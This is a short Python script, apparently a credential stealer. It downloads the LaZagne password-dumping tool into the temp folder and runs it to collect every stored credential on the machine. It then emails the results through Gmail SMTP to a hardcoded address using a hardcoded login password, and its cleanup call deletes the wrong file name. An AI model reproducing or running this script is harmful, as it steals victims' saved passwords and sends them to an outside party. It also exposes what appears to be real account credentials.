import requests, subprocess, smtplib, re, os, tempfile

def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as out_file:
        out_file.write(get_response.content)    

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
result = str(subprocess.check_output("lazagne.exe all", shell=True),"utf-8 ")
send_mail("muhammed.humam.hossain.f9@gmail.com","HEistleblower 09", result)
os.remove("lazagne.exe all")
